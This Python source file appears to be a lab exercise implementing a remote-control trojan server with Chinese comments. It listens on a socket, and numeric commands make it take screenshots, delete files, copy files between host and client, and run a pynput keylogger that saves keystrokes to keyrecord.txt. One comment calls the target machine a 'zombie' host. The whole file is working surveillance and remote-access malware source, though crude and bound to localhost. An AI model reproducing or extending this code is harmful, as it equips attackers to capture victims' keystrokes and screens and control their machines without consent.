import socket,sys,threading,struct,os,time,pyautogui
from a import getmenu
from b import copyfile
from pynput.keyboard import Key, Controller,Listener
import time

keyboard = Controller()
keys=[]
def on_press(key):
    global keys
               
    string = str(key).replace("'","")
    keys.append(string)
    main_string = "".join(keys)
                   #print(main_string)
                   #if len(main_string)>15:
    with open('keyrecord.txt', 'a') as f:
         f.write(main_string)   
         keys= []    
def on_release(key):
    if key == Key.esc:
        print("记录得到的字符保存在服务器端keyrecord.txt")
        return False
def service():
	#抛出错误
    try:
    	#创建套接字
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #配置端口释放规则,1代表立即释放,默认2min
        server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        serveraddr = ("127.0.0.1",1444)
        server.bind(serveraddr)
        server.listen(10)
    except socket.error as e:
        print("*建立Socket失败,由于:",e,sep="")
        sys.exit(1)

    print("等待客户端建立连接...")

    #循环，业务等待
    while True:
        #确认链接
        clientsocket,clientaddr = server.accept()
        
        m = clientsocket.recv(1024).decode("utf-8")
        
        print("建立连接成功{}".format(clientaddr))
        
        if m=="1":
        	print(f"接收到来自客户端的消息 {serveraddr}：{m}")
        if m=="2":
        
        	print("60s关机")
        	time.sleep(60)
        	exit()
        
        if m=="3":
        
        	print("取消关机")
    
        if m=="4":
        	
               getmenu()
               print("获取主机列表")
        if m=="5":
               print("截屏保存:screenshot.jpg")
               img = pyautogui.screenshot()
               cout=0
               cout += 1
               img.save("screenshot_{}.jpg".format(cout))
        
        if m=="6":
        
        	print("删除文件test.txt")
        	#清除图片
        	#for i in range(1, 4):
        	#os.remove("new_screenshot_{}.jpg".format(1))
        	os.remove("test.txt")
        
        if m=="7":
        
        	#print("将截屏图片上传，保存为new_screenshot")
        	#多线程
        	#t = threading.Thread(target=receiveDataFromClient,args=(clientsocket,clientaddr,))
        	#t.start()
               print("主机端：text1,myfile1;客户端：text2,myfile2")

               print("text文件中是要上传或下载的数据，myfile保存对面发送的数据")
               print("将客户端text2文件数据上传至主机端myfile1")
               #file1=open('test2.txt',mode='r',encoding='utf-8')#用读取方式打开test2.txt文本
               #file2=open('myfile1.txt',mode='w',encoding='utf-8')
               file1=open('/home/ubuntu/Desktop/lab9/client/test2.txt',mode='r',encoding='utf-8')
               #用读取方式打开test2.txt文本
               file2=open('myfile1.txt',mode='w',encoding='utf-8')
               #用写入方式打开myfile1.txt文本 myfile1.txt是需要复制的文件夹
               copyfile(file1,file2)
               print("上传客户端test2.txt到主机端myfile1.txt")
    
        if m=="8":
               print("主机端：text1,myfile1;客户端：text2,myfile2")

               print("text文件中是要上传或下载的数据，myfile保存对面发送的数据")
               print("将主机端text1文件数据上传至客户端myfile2")
               file1=open('test1.txt',mode='r',encoding='utf-8')#用读取方式打开test1.txt文本
               file2=open('/home/ubuntu/Desktop/lab9/client/myfile2.txt',mode='w',encoding='utf-8')
               #用写入方式打开myfile2.txt文本 myfile2.txt是需要复制的文件夹
               copyfile(file1,file2)
               print("主机端test1.txt下载到客户端myfile2.txt")
        if m=="9":
               print("进行键盘击键记录")
               print("如果想要停止记录，请按键盘上的esc键")
               
               with Listener(on_press=on_press,on_release=on_release) as listener:
                    listener.join()
               

#多线程接收数据
def receiveDataFromClient(clientsocket,clientaddr):
	#成功连接肉鸡的提示
    #print("建立连接成功{}".format(clientaddr))
    while True:
    	#设定单次接收图片的数据流大小为128bytes
        fileinfosize = struct.calcsize("128sl")
        fileinfopck = clientsocket.recv(fileinfosize)
        #如果数据流非空
        if fileinfopck:
        	#解包
            filename,filesize = struct.unpack("128sl",fileinfopck)
            filename = filename.strip(str.encode("\00"))

            #接收图片
            newfilename = os.path.join(str.encode("./myfile"),str.encode("new_")+filename)
            print("接收文件{},另存为{}".format(filename,newfilename))

            #统计接收量
            recv_file_size = 0
            #创建缓存文件
            tempfile = open(newfilename,"wb")
            #判断分段数据，写入缓存文件
            while not recv_file_size == filesize:
                if  filesize - recv_file_size > 1024:
                    recvdata = clientsocket.recv(1024)
                    recv_file_size += len(recvdata)
                else:
                    recvdata = clientsocket.recv(filesize - recv_file_size)
                    recv_file_size = filesize
                tempfile.write(recvdata)

            tempfile.close()
            print("文件接收完成,保存在{}".format(newfilename))
            
if __name__ == "__main__":
    service()
    
